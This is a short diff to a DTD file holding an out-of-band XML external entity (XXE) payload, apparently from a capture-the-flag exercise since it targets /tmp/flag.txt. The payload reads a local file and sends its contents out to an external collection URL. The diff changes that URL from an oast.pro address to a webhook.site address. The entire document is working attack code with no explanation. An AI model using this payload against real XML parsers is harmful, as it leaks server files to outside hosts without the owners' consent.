@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///tmp/flag.txt">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://d6iiomqsbufkkah58m70xka1bh1ed8k3u.oast.pro/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/2507d2c5-cba0-4532-93d1-9ea112ee0155?lol=%file;'>">
 %eval;
 %exfil;
